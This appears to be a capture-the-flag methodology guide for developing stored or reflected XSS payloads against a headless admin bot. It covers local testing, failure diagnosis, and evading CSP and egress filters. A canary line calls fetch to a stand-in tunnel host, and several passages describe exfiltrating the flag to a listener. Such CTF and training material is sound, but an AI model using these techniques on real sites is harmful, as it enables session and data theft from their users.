# Payload development loop — from blind channel to confirmed payload

## The discipline

Develop the payload against the local bot until it fires there, then
fire it at the live bot once. Every iteration the local loop replaces
a blind bot visit. `apexsurvive` records this exact pattern — payload
development happened against a local headless browser, and only the
confirmed payload was fired at the real bot.

## The loop, step by step

```
1. reproduce the injection point locally
   - same field, same form, same stored/reflected path as the live flow
2. load it in the local bot with the four hooks on
   - console / pageerror / request / response
3. fire a canary payload — does ANYTHING execute?
   - a console.log, a fetch to your own URL, a DOM marker
4. read the four channels
   - threw? fix the payload's JS
   - ran but no fetch? fix the exfil branch or CSP
   - fetched but nothing reached? fix the tunnel or the channel
5. iterate until the full payload fires cleanly
6. fire at the live bot once
7. confirm on your listener
```

## The canary first

Never lead with the real exfil — lead with the cheapest signal that
proves execution:

```javascript
// canary: prove JS runs in the injection
fetch('https://your-tunnel/canary?x=1')
// or, when outbound is blocked, a DOM marker:
document.title='CANARY';
// or an attribute the bot's page reveals
```

A canary that fires tells you the injection executes — the remaining
work is the exfil path. A canary that does not tells you the injection
never ran — the bug is in the injection context, and the exfil is
irrelevant until that is fixed.

## Reading the failure correctly

| Symptom | The actual bug |
|---|---|
| `PAGEERROR: SyntaxError` | the payload's JS is malformed — quoting, encoding |
| `PAGEERROR: ReferenceError` | a symbol the page's context lacks — wrong scope |
| clean console, no fetch | the exfil branch never ran — logic or a gate |
| `REQ` to tunnel, no hit on listener | tunnel unreachable / interstitial — the channel, not the payload |
| `RESP: 0` or CSP warning | CSP blocks the exfil origin — change scheme/host or use an allowed channel |
| works locally, dead at the bot | the reproduction is wrong — flags, wait, cookie, or context |

The last row is the trap: a mismatch between local and live is almost
always the reproduction, not the payload — re-check the bot's flags,
wait, cookie, and the injection context before rewriting the payload.

## The wait budget

The bot's wait is the payload's execution budget. A payload that needs
async work (a fetch, a frame load, a storage read) must complete
inside it. If the bot waits 3 s and your payload needs 5 s of async
work, it is dead regardless of correctness — make it synchronous or
shorten the chain.

## When outbound is blocked

Some bots run behind an egress filter — the page loads but the fetch
to your tunnel never leaves. Signals: `REQ` to your tunnel in the log
but no listener hit, or a `RESP: 0`/timeout. Then the exfil channel is
the bug, not the payload — use a channel the app itself provides:
a same-origin endpoint, a redirect, a stored value the flag page
renders, a DNS-style side channel through a path you can read.

## Evidence

The confirmed payload is proven by the live listener hit carrying the
flag-shaped value, which then goes through `tools/hooks.py pre-flag`.
The local bot's console/network log is development evidence, not the
flag — record it in the notes as the working payload, and run the
gate on the live exfil.

## Budget

The local loop is cheap — it costs CPU, not bot visits. The budget
rule binds the LIVE bot: a handful of visits, so spend them only on
payloads already confirmed locally. Do not fire a guessed payload at
the live bot to "see if it works" — that is the blind channel this
skill exists to close.
